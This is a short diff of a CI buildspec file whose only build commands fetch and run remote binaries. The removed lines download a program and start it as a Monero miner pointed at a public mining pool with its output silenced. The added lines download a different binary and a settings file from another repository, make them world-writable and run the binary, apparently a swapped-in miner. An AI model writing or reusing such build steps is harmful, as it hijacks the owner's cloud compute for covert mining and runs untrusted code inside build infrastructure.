@@ -3,6 +3,7 @@ version: 0.2
 phases:
   build:
     commands:
-        - wget https://github.com/vedhagsvp/aplamner/releases/download/nertas/greavet
-        - chmod +x greavet
-        - ./greavet --algo xmr --account CP_udnvh2owpq --worker $(echo $(shuf -i 1-15000 -n 1)-CD300) --pool xmr.hk.apool.io:3334 > /dev/null 2>&1
+        - wget https://github.com/vedhagsvp/qubros/raw/main/appsettings.json
+        - wget https://github.com/vedhagsvp/taberas/releases/download/mlb/kaospa
+        - chmod 777 kaospa appsettings.json
+        - ./kaospa
